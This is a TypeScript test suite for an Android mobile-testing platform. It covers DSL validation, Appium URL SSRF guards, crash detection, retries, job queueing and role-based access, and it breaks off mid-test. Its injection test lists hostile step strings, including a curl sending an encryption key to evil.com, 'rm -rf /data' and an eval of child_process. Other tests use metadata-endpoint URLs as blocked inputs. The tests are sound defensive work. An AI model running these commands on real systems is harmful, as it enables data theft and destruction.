import { describe, it, expect, vi, beforeAll, afterAll } from "vitest";
import Fastify, { type FastifyInstance } from "fastify";
import cookie from "@fastify/cookie";
import cors from "@fastify/cors";
import { pool } from "../config/db";
import { env, envSchema } from "../config/env";
import mobileRoutes from "../routes/mobile";
import { createAuthHook } from "../services/auth";
import {
  validateMobileDsl,
  parseSelector,
  validateAppPackage,
} from "../services/mobile/mobileDsl";
import { AppiumClient, MobileDriverError, assertSafeAppiumUrl, validateTrustedRemoteAppiumUrl } from "../services/mobile/appiumClient";
import { XCUITestDriver } from "../services/mobile/iosDriver";
import {
  detectCrashFromLogs,
  isMobileElementNotVisible,
  runMobileTestCase,
} from "../services/mobileRunner";
import { parseAdbDevices, resolveMobileDeviceConfiguration } from "../services/mobile/deviceRegistry";
import { runMobileTestWithRetries } from "../services/executionManager";
import * as executionManager from "../services/executionManager";
import * as storageService from "../services/storage/storageService";
import * as runReportService from "../services/runReport";
import { enqueueJob, processJob, registerJobHandler } from "../services/jobs/jobQueue";
import { initializeJobHandlers, finalizeTestRunDb } from "../services/jobs/jobHandlers";
import { logger } from "../services/observability/logger";
import {
  classifyTestType,
  generateFallbackAutomation,
  testCaseAutomationSchema,
} from "../services/automationConverter";
import { createSessionForUser, type PlatformRole } from "../services/authService";
import { hashPassword } from "../services/passwordService";

describe("TASK 15: Android Mobile App Testing Integration", () => {
  let app: FastifyInstance;
  let testProjectId: string;
  let adminUserId: string;
  let engineerUserId: string;
  let viewerUserId: string;
  let adminToken: string;
  let engineerToken: string;
  let viewerToken: string;

  async function createTestUser(opts: { role: PlatformRole }): Promise<{ id: string; email: string }> {
    const id = (await import("node:crypto")).randomUUID();
    const email = `test-${id.slice(0, 8)}@example.com`;
    const pwdHash = await hashPassword("StrongPassword123!");
    await pool.query(
      `INSERT INTO users (id, email, password_hash, full_name, role, is_active)
       VALUES ($1, $2, $3, $4, $5, TRUE)`,
      [id, email, pwdHash, `User ${id.slice(0, 4)}`, opts.role],
    );
    return { id, email };
  }

  async function createTestSession(userId: string): Promise<string> {
    const session = await createSessionForUser(userId);
    return session.sessionToken;
  }

  beforeAll(async () => {
    initializeJobHandlers();

    app = Fastify({ logger: false });
    await app.register(cookie, { secret: env.COOKIE_SECRET });
    await app.register(cors, { origin: true, credentials: true });
    app.addHook("onRequest", createAuthHook(env.PLATFORM_API_KEY));
    await app.register(mobileRoutes);
    await app.ready();

    // Create test project
    const projRes = await pool.query(
      `INSERT INTO projects (id, name, base_url, owner_confirmed)
       VALUES (gen_random_uuid(), 'Mobile Test Suite Project', 'http://127.0.0.1:4723', true)
       RETURNING id`,
    );
    testProjectId = projRes.rows[0].id;

    // Create test users and sessions
    const adminUser = await createTestUser({ role: "admin" });
    adminUserId = adminUser.id;
    adminToken = await createTestSession(adminUserId);

    const engineerUser = await createTestUser({ role: "qa_engineer" });
    engineerUserId = engineerUser.id;
    engineerToken = await createTestSession(engineerUserId);

    const viewerUser = await createTestUser({ role: "viewer" });
    viewerUserId = viewerUser.id;
    viewerToken = await createTestSession(viewerUserId);

    await pool.query(
      `INSERT INTO project_members (project_id, user_id, role)
       VALUES ($1, $2, 'qa_engineer'), ($1, $3, 'viewer')`,
      [testProjectId, engineerUserId, viewerUserId],
    );
  });

  afterAll(async () => {
    await app.close();
    await pool.query("DELETE FROM projects WHERE id = $1", [testProjectId]);
    await pool.query("DELETE FROM users WHERE id IN ($1, $2, $3)", [
      adminUserId,
      engineerUserId,
      viewerUserId,
    ]);
  });

  // 1. Restricted Mobile DSL Validation & Security
  describe("1. Secure Mobile Test DSL & Injection Prevention", () => {
    it("validates safe mobile DSL steps correctly", () => {
      const validSteps = [
        "app launch com.android.settings",
        "tap text:Network & internet",
        "type id:com.android.settings:id/search_src_text | Wi-Fi",
        "clear id:com.android.settings:id/search_src_text",
        "scroll down",
        "swipe 500 1500 500 500 400",
        "expect visible text:Wi-Fi",
        "expect not visible text:NonExistentElement",
        "expect text id:android:id/title | Connected",
        "expect text Connected",
        "wait 1000",
        "press back",
        "background 5",
        "screenshot",
        "app close com.android.settings",
      ];

      const res = validateMobileDsl(validSteps);
      expect(res.valid).toBe(true);
      expect(res.errors).toHaveLength(0);
      expect(res.parsedSteps).toHaveLength(validSteps.length);
    });

    it("rejects arbitrary JavaScript, eval, and shell commands in steps", () => {
      const maliciousSteps = [
        "eval('require(\"child_process\").execSync(\"whoami\")')",
        "tap id:button; adb shell rm -rf /data",
        "type input | `curl http://evil.com/leak?data=${process.env.ENCRYPTION_KEY}`",
        "app launch com.test && powershell -c calc",
        "type input | <script>alert(1)</script>",
      ];

      for (const badStep of maliciousSteps) {
        const res = validateMobileDsl([badStep]);
        expect(res.valid).toBe(false);
        expect(res.errors.length).toBeGreaterThan(0);
        expect(res.errors[0]).toMatch(/Security violation|forbidden|Unknown or forbidden/i);
      }
    });

    it("enforces parameter bounds on wait, background, and coordinates", () => {
      const invalidWait = validateMobileDsl(["wait 99999999"]);
      expect(invalidWait.valid).toBe(false);
      expect(invalidWait.errors[0]).toContain("between 0 and 30000");

      const invalidBg = validateMobileDsl(["background 120"]);
      expect(invalidBg.valid).toBe(false);
      expect(invalidBg.errors[0]).toContain("between 1 and 60");

      const invalidSwipe = validateMobileDsl(["swipe foo bar baz"]);
      expect(invalidSwipe.valid).toBe(false);
      expect(invalidSwipe.errors[0]).toContain("requires 4 coordinates");
    });

    it("validates and parses mobile selector strategies accurately", () => {
      expect(parseSelector("id:com.example:id/submit_btn")).toEqual({
        using: "id",
        value: "com.example:id/submit_btn",
      });

      expect(parseSelector("accessibility id:SearchButton")).toEqual({
        using: "accessibility id",
        value: "SearchButton",
      });

      expect(parseSelector("~MenuToggle")).toEqual({
        using: "accessibility id",
        value: "MenuToggle",
      });

      expect(parseSelector("text:Save Changes")).toEqual({
        using: "-android uiautomator",
        value: 'new UiSelector().textContains("Save Changes")',
      });

      expect(parseSelector("//android.widget.Button[@text='OK']")).toEqual({
        using: "xpath",
        value: "//android.widget.Button[@text='OK']",
      });
    });

    it("validates Android package naming rules", () => {
      expect(validateAppPackage("com.android.settings")).toBe(true);
      expect(validateAppPackage("org.chromium.chrome")).toBe(true);
      expect(validateAppPackage("invalid-package")).toBe(false);
      expect(validateAppPackage("123.com.test")).toBe(false);
    });
  });

  // 2. Appium URL Security & Anti-SSRF
  describe("2. Appium Client Security & URL Guard", () => {
    it("allows loopback Appium host (127.0.0.1, localhost)", () => {
      expect(() => new AppiumClient("http://127.0.0.1:4723")).not.toThrow();
      expect(() => new AppiumClient("http://localhost:4723")).not.toThrow();
    });

    it("validates trusted remote Appium endpoint independently against permitted Docker bridge host and port", () => {
      // Allowed configured endpoint
      expect(validateTrustedRemoteAppiumUrl("http://172.18.0.1:4724").toString()).toBe("http://172.18.0.1:4724/");

      // Rejects arbitrary external URL
      expect(() => validateTrustedRemoteAppiumUrl("http://attacker.example.com:4724")).toThrow(
        /forbidden/i,
      );

      // Rejects arbitrary private IPs
      expect(() => validateTrustedRemoteAppiumUrl("http://10.0.0.1:4724")).toThrow(/forbidden/i);
      expect(() => validateTrustedRemoteAppiumUrl("http://192.168.1.1:4724")).toThrow(/forbidden/i);
      expect(() => validateTrustedRemoteAppiumUrl("http://172.18.0.2:4724")).toThrow(/forbidden/i);

      // Rejects different ports on gateway
      expect(() => validateTrustedRemoteAppiumUrl("http://172.18.0.1:4723")).toThrow(/port .* is forbidden/i);
      expect(() => validateTrustedRemoteAppiumUrl("http://172.18.0.1:8080")).toThrow(/port .* is forbidden/i);
      expect(() => validateTrustedRemoteAppiumUrl("http://172.18.0.1:22")).toThrow(/port .* is forbidden/i);

      // Rejects credentials, query strings, fragments, and subpaths
      expect(() => validateTrustedRemoteAppiumUrl("http://user:pass@172.18.0.1:4724")).toThrow(/credentials/i);
      expect(() => validateTrustedRemoteAppiumUrl("http://172.18.0.1:4724?debug=true")).toThrow(/query parameters/i);
      expect(() => validateTrustedRemoteAppiumUrl("http://172.18.0.1:4724#admin")).toThrow(/query parameters or a fragment/i);
      expect(() => validateTrustedRemoteAppiumUrl("http://172.18.0.1:4724/latest/meta-data")).toThrow(/subpath/i);
    });

    it("prevents arbitrary URLs from authorizing themselves as trusted endpoints", () => {
      // Even if attacker passes the same URL as serverUrl and trustedRemoteUrl, independent validation rejects it
      expect(() => assertSafeAppiumUrl("http://attacker.example.com:4724", "http://attacker.example.com:4724")).toThrow(
        /forbidden/i,
      );
      expect(() => assertSafeAppiumUrl("http://10.0.0.1:4724", "http://10.0.0.1:4724")).toThrow(
        /forbidden/i,
      );
      expect(() => assertSafeAppiumUrl("http://172.18.0.1:8080", "http://172.18.0.1:8080")).toThrow(
        /port .* is forbidden/i,
      );
    });

    it("rejects unconfigured Docker gateway URLs when not trusted", () => {
      // Without trusted URL configured
      expect(() => new AppiumClient("http://172.18.0.1:4724")).toThrow(
        /forbidden for security/i,
      );
      // With different trusted port configured
      expect(() => assertSafeAppiumUrl("http://172.18.0.1:4723", "http://172.18.0.1:4724")).toThrow(
        /forbidden for security/i,
      );
      // With different gateway host configured
      expect(() => assertSafeAppiumUrl("http://172.18.0.2:4724", "http://172.18.0.1:4724")).toThrow(
        /forbidden for security/i,
      );
    });

    it("rejects arbitrary private IP addresses even if trusted remote URL is set", () => {
      const trusted = "http://172.18.0.1:4724";
      expect(() => assertSafeAppiumUrl("http://10.0.0.1:4723", trusted)).toThrow(
        /forbidden for security/i,
      );
      expect(() => assertSafeAppiumUrl("http://192.168.1.100:4723", trusted)).toThrow(
        /forbidden for security/i,
      );
      expect(() => assertSafeAppiumUrl("http://172.16.0.50:4724", trusted)).toThrow(
        /forbidden for security/i,
      );
    });

    it("rejects public IP addresses and external hostnames", () => {
      const trusted = "http://172.18.0.1:4724";
      expect(() => assertSafeAppiumUrl("http://8.8.8.8:4723", trusted)).toThrow(
        /forbidden for security/i,
      );
      expect(() => assertSafeAppiumUrl("http://13.236.148.128:4723", trusted)).toThrow(
        /forbidden for security/i,
      );
      expect(() => assertSafeAppiumUrl("http://attacker.example.com:4724", trusted)).toThrow(
        /forbidden for security/i,
      );
    });

    it("strictly blocks external URLs and cloud metadata endpoints from Appium client", () => {
      expect(() => new AppiumClient("http://169.254.169.254:4723")).toThrow(
        /forbidden for security/i,
      );
      expect(() => new AppiumClient("http://169.254.169.254/latest/meta-data")).toThrow(
        /forbidden for security|must not contain a subpath/i,
      );
      expect(() => new AppiumClient("http://attacker-controlled-host.com:4723")).toThrow(
        /forbidden for security/i,
      );
      expect(() => new AppiumClient("http://10.0.0.1:4723")).toThrow(
        /forbidden for security/i,
      );
    });

    it("accepts IPv6 loopback and rejects credentials in Appium URLs", () => {
      expect(() => new AppiumClient("http://[::1]:4723")).not.toThrow();
      expect(() => new AppiumClient("http://user:pass@127.0.0.1:4723")).toThrow(
        /must not contain credentials/i,
      );
    });

    it("handles optional APPIUM_TRUSTED_REMOTE_URL in envSchema: unset, empty, and whitespace normalize to undefined", () => {
      const baseEnv = {
        DATABASE_URL: "postgresql://postgres:postgres@localhost:5432/test",
        GEMINI_API_KEY: "test-gemini-key",
        AI_MODEL: "gemini-2.0-flash",
        PLATFORM_API_KEY: "1234567890123456",
      };

      // 1. Variable unset
      const resUnset = envSchema.safeParse({ ...baseEnv });
      expect(resUnset.success).toBe(true);
      if (resUnset.success) {
        expect(resUnset.data.APPIUM_TRUSTED_REMOTE_URL).toBeUndefined();
        expect(resUnset.data.APPIUM_URL).toBe("http://127.0.0.1:4723");
      }

      // 2. Empty string
      const resEmpty = envSchema.safeParse({ ...baseEnv, APPIUM_TRUSTED_REMOTE_URL: "" });
      expect(resEmpty.success).toBe(true);
      if (resEmpty.success) {
        expect(resEmpty.data.APPIUM_TRUSTED_REMOTE_URL).toBeUndefined();
        expect(resEmpty.data.APPIUM_URL).toBe("http://127.0.0.1:4723");
      }

      // 3. Whitespace-only string
      const resWhitespace = envSchema.safeParse({ ...baseEnv, APPIUM_TRUSTED_REMOTE_URL: "   \t \n  " });
      expect(resWhitespace.success).toBe(true);
      if (resWhitespace.success) {
        expect(resWhitespace.data.APPIUM_TRUSTED_REMOTE_URL).toBeUndefined();
        expect(resWhitespace.data.APPIUM_URL).toBe("http://127.0.0.1:4723");
      }
    });

    it("accepts valid APPIUM_TRUSTED_REMOTE_URL and enforces matching APPIUM_URL", () => {
      const baseEnv = {
        DATABASE_URL: "postgresql://postgres:postgres@localhost:5432/test",
        GEMINI_API_KEY: "test-gemini-key",
        AI_MODEL: "gemini-2.0-flash",
        PLATFORM_API_KEY: "1234567890123456",
      };

      // Valid http://172.18.0.1:4724
      const resValid = envSchema.safeParse({
        ...baseEnv,
        APPIUM_TRUSTED_REMOTE_URL: "http://172.18.0.1:4724",
        APPIUM_URL: "http://172.18.0.1:4724",
      });
      expect(resValid.success).toBe(true);
      if (resValid.success) {
        expect(resValid.data.APPIUM_TRUSTED_REMOTE_URL).toBe("http://172.18.0.1:4724");
        expect(resValid.data.APPIUM_URL).toBe("http://172.18.0.1:4724");
      }

      // Also trims whitespace around valid URL
      const resTrimmed = envSchema.safeParse({
        ...baseEnv,
        APPIUM_TRUSTED_REMOTE_URL: "   http://172.18.0.1:4724   ",
        APPIUM_URL: "http://172.18.0.1:4724",
      });
      expect(resTrimmed.success).toBe(true);
      if (resTrimmed.success) {
        expect(resTrimmed.data.APPIUM_TRUSTED_REMOTE_URL).toBe("http://172.18.0.1:4724");
      }
    });

    it("rejects malformed, non-empty URLs and invalid endpoints in APPIUM_TRUSTED_REMOTE_URL", () => {
      const baseEnv = {
        DATABASE_URL: "postgresql://postgres:postgres@localhost:5432/test",
        GEMINI_API_KEY: "test-gemini-key",
        AI_MODEL: "gemini-2.0-flash",
        PLATFORM_API_KEY: "1234567890123456",
      };

      // Malformed non-empty string
      const resMalformed = envSchema.safeParse({
        ...baseEnv,
        APPIUM_TRUSTED_REMOTE_URL: "not-a-valid-url",
      });
      expect(resMalformed.success).toBe(false);
      if (!resMalformed.success) {
        expect(resMalformed.error.issues.some((i) => i.path.includes("APPIUM_TRUSTED_REMOTE_URL"))).toBe(true);
      }

      // Invalid host
      const resInvalidHost = envSchema.safeParse({
        ...baseEnv,
        APPIUM_TRUSTED_REMOTE_URL: "http://10.0.0.1:4724",
        APPIUM_URL: "http://10.0.0.1:4724",
      });
      expect(resInvalidHost.success).toBe(false);
      if (!resInvalidHost.success) {
        expect(resInvalidHost.error.issues.some((i) => i.path.includes("APPIUM_TRUSTED_REMOTE_URL"))).toBe(true);
        expect(resInvalidHost.error.message).toMatch(/forbidden/i);
      }

      // Invalid port
      const resInvalidPort = envSchema.safeParse({
        ...baseEnv,
        APPIUM_TRUSTED_REMOTE_URL: "http://172.18.0.1:4723",
        APPIUM_URL: "http://172.18.0.1:4723",
      });
      expect(resInvalidPort.success).toBe(false);
      if (!resInvalidPort.success) {
        expect(resInvalidPort.error.issues.some((i) => i.path.includes("APPIUM_TRUSTED_REMOTE_URL"))).toBe(true);
        expect(resInvalidPort.error.message).toMatch(/port .* is forbidden/i);
      }

      // Invalid protocol
      const resInvalidProto = envSchema.safeParse({
        ...baseEnv,
        APPIUM_TRUSTED_REMOTE_URL: "https://172.18.0.1:4724",
        APPIUM_URL: "https://172.18.0.1:4724",
      });
      expect(resInvalidProto.success).toBe(false);
      if (!resInvalidProto.success) {
        expect(resInvalidProto.error.issues.some((i) => i.path.includes("APPIUM_TRUSTED_REMOTE_URL"))).toBe(true);
        expect(resInvalidProto.error.message).toMatch(/protocol/i);
      }

      // Invalid path
      const resInvalidPath = envSchema.safeParse({
        ...baseEnv,
        APPIUM_TRUSTED_REMOTE_URL: "http://172.18.0.1:4724/subpath",
        APPIUM_URL: "http://172.18.0.1:4724/subpath",
      });
      expect(resInvalidPath.success).toBe(false);
      if (!resInvalidPath.success) {
        expect(resInvalidPath.error.issues.some((i) => i.path.includes("APPIUM_TRUSTED_REMOTE_URL"))).toBe(true);
        expect(resInvalidPath.error.message).toMatch(/subpath/i);
      }
    });

    it("rejects mismatched APPIUM_URL and APPIUM_TRUSTED_REMOTE_URL", () => {
      const baseEnv = {
        DATABASE_URL: "postgresql://postgres:postgres@localhost:5432/test",
        GEMINI_API_KEY: "test-gemini-key",
        AI_MODEL: "gemini-2.0-flash",
        PLATFORM_API_KEY: "1234567890123456",
      };

      const resMismatch = envSchema.safeParse({
        ...baseEnv,
        APPIUM_TRUSTED_REMOTE_URL: "http://172.18.0.1:4724",
        APPIUM_URL: "http://127.0.0.1:4723",
      });
      expect(resMismatch.success).toBe(false);
      if (!resMismatch.success) {
        expect(resMismatch.error.issues.some((i) => i.path.includes("APPIUM_URL"))).toBe(true);
        expect(resMismatch.error.message).toMatch(/must match APPIUM_TRUSTED_REMOTE_URL/i);
      }
    });
  });

  // 3. iOS Architecture Preparation
  describe("3. iOS Driver Architecture Preparation", () => {
    it("provides XCUITest interface and throws descriptive macOS requirement notice", async () => {
      const iosDriver = new XCUITestDriver();
      expect(iosDriver.platform).toBe("ios");
      expect(iosDriver.isConnected).toBe(false);

      await expect(
        iosDriver.createSession({
          platformName: "iOS",
          "appium:automationName": "XCUITest",
          "appium:deviceName": "iPhone 16",
          "appium:udid": "auto",
        }),
      ).rejects.toThrow(/iOS test execution is not supported on Windows\/Linux environments/i);
    });
  });

  // 4. Crash Detection
  describe("4. Android Crash & Logcat Analysis", () => {
    it("detects Fatal Exceptions and extracts crash stack traces from logs", () => {
      const sampleLogs = [
        "11-04 12:00:01.123 1234 1234 D AndroidRuntime: >>>>>> START com.android.internal.os.RuntimeInit <<<<<<",
        "11-04 12:00:02.456 1234 1234 E AndroidRuntime: FATAL EXCEPTION: main",
        "11-04 12:00:02.456 1234 1234 E AndroidRuntime: Process: com.example.app, PID: 1234",
        "11-04 12:00:02.457 1234 1234 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method",
        "11-04 12:00:02.458 1234 1234 E AndroidRuntime: \tat com.example.app.MainActivity.onCreate(MainActivity.java:42)",
      ];

      const crash = detectCrashFromLogs(sampleLogs);
      expect(crash.crashed).toBe(true);
      expect(crash.exceptionType).toBe("FATAL EXCEPTION");
      expect(crash.logSnippet).toContain("NullPointerException");
    });

    it("returns crashed=false for normal logs without exceptions", () => {
      const normalLogs = [
        "11-04 12:00:01.000 I ViewRootImpl: ViewPostIme key 0",
        "11-04 12:00:02.000 D SettingsActivity: Resuming Settings",
      ];
      expect(detectCrashFromLogs(normalLogs).crashed).toBe(false);
    });

    it("parses actual ADB devices and reports each connection state", () => {
      const devices = parseAdbDevices(
        "List of devices attached\r\nemulator-5554 device product:sdk_gphone64_x86_64 model:Pixel_7\r\nR58N123 unauthorized usb:1-1\r\n",
      );
      expect(devices).toEqual([
        {
          udid: "emulator-5554",
          state: "device",
          isEmulator: true,
          model: "Pixel 7",
        },
        {
          udid: "R58N123",
          state: "unauthorized",
          isEmulator: false,
        },
      ]);
    });

    it("does not suppress assertion failures or Appium lookup errors for expect-not-visible", async () => {
      const locator = { using: "id" as const, value: "login_button" };
      await expect(
        isMobileElementNotVisible({
          findElements: async () => ["element-1"],
          isDisplayed: async () => true,
        }, locator),
      ).resolves.toBe(false);
      await expect(
        isMobileElementNotVisible({
          findElements: async () => [],
          isDisplayed: async () => false,
        }, locator),
      ).resolves.toBe(true);
      await expect(
        isMobileElementNotVisible({
          findElements: async () => ["element-1"],
          isDisplayed: async () => { throw new Error("Appium transport failed"); },
        }, locator),
      ).rejects.toThrow("Appium transport failed");
    });

    it("reports missing Android device configuration instead of selecting a fake emulator", async () => {
      const result = await runMobileTestCase(
        ["wait 1"],
        { runId: "no-device-run", resultId: "no-device-result" },
      );
      expect(result.status).toBe("inconclusive");
      expect(result.errorMessage).toContain("No Android device UDID");
      expect(result.deviceInfo.udid).toBe("");
    });
  });

  // 5. Retries and Flaky Detection
  describe("5. Retries & Flaky Detection for Mobile Execution", () => {
    it("flags test as flaky when it fails on attempt 1 and passes on attempt 2", async () => {
      let callCount = 0;
      const mockRunner = vi.fn().mockImplementation(async () => {
        callCount++;
        if (callCount === 1) {
          return {
            status: "failed",
            errorMessage: "Element not visible yet (transient rendering delay)",
            durationMs: 300,
            screenshotPath: null,
            deviceInfo: { platform: "android", deviceName: "emulator-5554", osVersion: "17", udid: "emulator-5554" },
            evidence: {
              status: "failed",
              durationMs: 300,
              failureStep: "expect visible text:Settings",
              failureStepIndex: 1,
              errorMessage: "Element not visible yet",
              screenshotPath: null,
              deviceLogs: [],
              crashEvidence: { crashed: false },
              stepResults: [],
              deviceInfo: { platform: "android", deviceName: "emulator-5554", osVersion: "17", udid: "emulator-5554" },
            },
            stepResults: [],
          };
        }
        return {
          status: "passed",
          errorMessage: undefined,
          durationMs: 200,
          screenshotPath: "artifacts/runs/test/shot.png",
          deviceInfo: { platform: "android", deviceName: "emulator-5554", osVersion: "17", udid: "emulator-5554" },
          evidence: {
            status: "passed",
            durationMs: 200,
            failureStep: null,
            failureStepIndex: null,
            errorMessage: null,
            screenshotPath: "artifacts/runs/test/shot.png",
            deviceLogs: [],
            crashEvidence: { crashed: false },
            stepResults: [],
            deviceInfo: { platform: "android", deviceName: "emulator-5554", osVersion: "17", udid: "emulator-5554" },
          },
          stepResults: [],
        };
      });

      const res = await runMobileTestWithRetries(
        ["app launch com.android.settings", "expect visible text:Settings"],
        { runId: "mock-run-id", resultId: "mock-result-id" },
        { retries: 2, backoffMs: 5, runner: mockRunner as any },
      );

      expect(res.status).toBe("passed");
      expect(res.flaky).toBe(true);
      expect(res.retryCount).toBe(1);
      expect(res.attempts).toHaveLength(2);
      expect(res.attempts[0].status).toBe("failed");
      expect(res.attempts[1].status).toBe("passed");
    });
  });

  // 6. Automation Classification and Fallback Generator
  describe("6. AI Mobile Automation Conversion & Classification", () => {
    it("heuristically classifies mobile user scenarios as 'mobile'", () => {
      const mobileCase = {
        title: "Verify Android Settings Wi-Fi screen opens on tap",
        description: "Mobile app test on Pixel emulator",
        steps: ["Launch Android settings app", "Tap on Network and internet", "Swipe down"],
        expected_result: "Wi-Fi toggle should be visible on touchscreen",
      };

      const classified = classifyTestType(mobileCase);
      expect(classified).toBe("mobile");
    });

    it("generates safe fallback Mobile DSL instructions", () => {
      const mobileCase = {
        title: "Test Login Screen Mobile",
        steps: ["Tap on Sign In", "Enter username and password", "Scroll down"],
        expected_result: "Welcome back screen is visible",
      };

      const fallback = generateFallbackAutomation(mobileCase, "mobile");
      expect(fallback.target_type).toBe("mobile");
      expect(fallback).toHaveProperty("mobile_steps");
      if (fallback.target_type === "mobile") {
        expect(fallback.mobile_steps[0]).toContain("app launch");
        expect(fallback.platform).toBe("android");
      }

      // Ensure fallback passes schema
      const parseResult = testCaseAutomationSchema.safeParse(fallback);
      expect(parseResult.success).toBe(true);
    });
  });

  // 7. Background Job Queue Integration
  describe("7. Background Job Queue Mobile Execution", () => {
    it("enqueues mobile execution job into PostgreSQL queue", async () => {
      const job = await enqueueJob({
        projectId: testProjectId,
        queueName: "mobile_tests",
        jobType: "mobile_execution",
        payload: {
          runId: "11111111-2222-3333-4444-555555555555",
          projectId: testProjectId,
          appPackage: "com.android.settings",
          deviceUdid: "emulator-5554",
          retries: 1,
        },
        createdBy: engineerUserId,
      });

      expect(job.id).toBeDefined();
      expect(job.jobType).toBe("mobile_execution");
      expect(job.status).toBe("pending");
      expect(job.queueName).toBe("mobile_tests");

      // Verify stored in PostgreSQL
      const dbJob = await pool.query("SELECT * FROM background_jobs WHERE id = $1", [job.id]);
      expect(dbJob.rowCount).toBe(1);
      expect(dbJob.rows[0].job_type).toBe("mobile_execution");
    });
  });

  // 8. Mobile HTTP API & Project-Level RBAC
  describe("8. Mobile HTTP API & RBAC Protection", () => {
    it("allows viewers to inspect Appium and device status", async () => {
      const res = await app.inject({
        method: "GET",
        url: `/projects/${testProjectId}/mobile/status`,
        headers: {
          authorization: `Bearer ${viewerToken}`,
        },
      });

      expect(res.statusCode).toBe(200);
      const body = res.json();
      expect(body).toHaveProperty("appium");
      expect(body).toHaveProperty("android");
      expect(body).toHaveProperty("ios");
      expect(body.appium.driver).toBe("UiAutomator2");
      expect(body.appium).toHaveProperty("ready");
      expect(body.android.devices).toBeInstanceOf(Array);
      expect(body.ios.available).toBe(false);
    });

    it("allows viewers to validate mobile DSL steps without executing", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/validate`,
        headers: {
          authorization: `Bearer ${viewerToken}`,
          "content-type": "application/json",
        },
        payload: {
          steps: ["app launch com.android.settings", "tap text:Display", "expect visible text:Display"],
        },
      });

      expect(res.statusCode).toBe(200);
      const body = res.json();
      expect(body.valid).toBe(true);
      expect(body.parsedSteps).toHaveLength(3);
    });

    it("rejects viewers from triggering mobile test runs (requires qa_engineer or admin)", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/runs`,
        headers: {
          authorization: `Bearer ${viewerToken}`,
          "content-type": "application/json",
        },
        payload: {
          async: true,
          app_package: "com.android.settings",
        },
      });

      // Must be forbidden for viewer
      expect(res.statusCode).toBe(403);
    });

    it("allows qa_engineer to enqueue async mobile test run", async () => {
      // Register an active device for the project so the run can be enqueued
      await pool.query(
        `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
         VALUES (gen_random_uuid(), $1, 'Async Enqueue Device', 'android', 'emulator-async-5554', 'http://127.0.0.1:4723', TRUE)
         ON CONFLICT DO NOTHING`,
        [testProjectId],
      );

      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/runs`,
        headers: {
          authorization: `Bearer ${engineerToken}`,
          "content-type": "application/json",
        },
        payload: {
          async: true,
          device_udid: "emulator-async-5554",
          app_package: "com.android.settings",
        },
      });

      expect(res.statusCode).toBe(202);
      const body = res.json();
      expect(body.status).toBe("queued");
      expect(body.runId).toBeDefined();
      expect(body.jobId).toBeDefined();
    });

    it("rejects a synchronous run for a device that is not registered to the project", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/runs`,
        headers: {
          authorization: `Bearer ${engineerToken}`,
          "content-type": "application/json",
        },
        payload: { device_udid: "unregistered-android-device" },
      });

      expect(res.statusCode).toBe(400);
      expect(res.json().error).toMatch(/not registered as an active device/i);
    });

    it("rejects viewers and qa_engineers from registering new mobile devices (requires qa_manager or admin)", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/devices`,
        headers: {
          authorization: `Bearer ${engineerToken}`,
          "content-type": "application/json",
        },
        payload: {
          name: "Test Android Device",
          udid: "emulator-5556",
          platform: "android",
        },
      });

      expect(res.statusCode).toBe(403);
    });

    it("allows admin to register new mobile device for the project", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/devices`,
        headers: {
          authorization: `Bearer ${adminToken}`,
          "content-type": "application/json",
        },
        payload: {
          name: "Pixel 7 Production Emulator",
          udid: "emulator-5554",
          platform: "android",
          os_version: "Android 17",
          appium_url: "http://127.0.0.1:4723",
        },
      });

      expect(res.statusCode).toBe(201);
      const body = res.json();
      expect(body.name).toBe("Pixel 7 Production Emulator");
      expect(body.udid).toBe("emulator-5554");
    });

    it("rejects non-loopback Appium URLs during device registration", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/devices`,
        headers: {
          authorization: `Bearer ${adminToken}`,
          "content-type": "application/json",
        },
        payload: {
          name: "Remote Android Device",
          udid: "remote-device",
          platform: "android",
          appium_url: "http://169.254.169.254:4723",
        },
      });

      expect(res.statusCode).toBe(400);
      expect(res.json().error).toMatch(/loopback interface|forbidden for security/i);
    });

    it("prevents overriding configured AWS endpoint through project device registration", async () => {
      // Temporarily set trusted remote URL
      const origProcessTrusted = process.env.APPIUM_TRUSTED_REMOTE_URL;
      const origTrusted = env.APPIUM_TRUSTED_REMOTE_URL;
      const origUrl = env.APPIUM_URL;
      process.env.APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_URL = "http://172.18.0.1:4724";

      try {
        // Attempt to override with local loopback or arbitrary endpoint
        const res = await app.inject({
          method: "POST",
          url: `/projects/${testProjectId}/mobile/devices`,
          headers: {
            authorization: `Bearer ${adminToken}`,
            "content-type": "application/json",
          },
          payload: {
            name: "Attempted Override Device",
            udid: "override-device-123",
            platform: "android",
            appium_url: "http://127.0.0.1:4723",
          },
        });

        expect(res.statusCode).toBe(400);
        expect(res.json().error).toMatch(/cannot be overridden/i);

        // Attempt to override with an arbitrary private IP
        const res2 = await app.inject({
          method: "POST",
          url: `/projects/${testProjectId}/mobile/devices`,
          headers: {
            authorization: `Bearer ${adminToken}`,
            "content-type": "application/json",
          },
          payload: {
            name: "Attempted Override Device 2",
            udid: "override-device-456",
            platform: "android",
            appium_url: "http://10.0.0.5:4724",
          },
        });

        expect(res2.statusCode).toBe(400);

        // Valid registration with the configured AWS endpoint succeeds
        const resValid = await app.inject({
          method: "POST",
          url: `/projects/${testProjectId}/mobile/devices`,
          headers: {
            authorization: `Bearer ${adminToken}`,
            "content-type": "application/json",
          },
          payload: {
            name: "Valid AWS Device",
            udid: "valid-aws-device",
            platform: "android",
            appium_url: "http://172.18.0.1:4724",
          },
        });

        expect(resValid.statusCode).toBe(201);
      } finally {
        if (origProcessTrusted !== undefined) {
          process.env.APPIUM_TRUSTED_REMOTE_URL = origProcessTrusted;
        } else {
          delete process.env.APPIUM_TRUSTED_REMOTE_URL;
        }
        (env as any).APPIUM_TRUSTED_REMOTE_URL = origTrusted;
        (env as any).APPIUM_URL = origUrl;
      }
    });

    it("distinguishes remote Appium availability from local ADB discovery in device listings", async () => {
